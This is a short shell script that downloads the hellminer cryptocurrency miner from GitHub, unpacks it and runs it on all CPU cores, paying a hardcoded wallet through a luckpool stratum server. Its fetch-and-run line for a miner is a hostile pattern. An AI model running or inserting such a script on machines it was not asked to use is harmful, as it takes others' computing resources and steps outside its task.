#!/bin/sh
worker=$(echo $(shuf -i 1-5 -n 1)-SABAR)
wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && ./hellminer -c  stratum+tcp://ap.luckpool.net:3956#xnsub -u RNFKJmc4mPFomtJDE3iFht1oJczNesGU2i.$worker -p x --cpu $(nproc --all)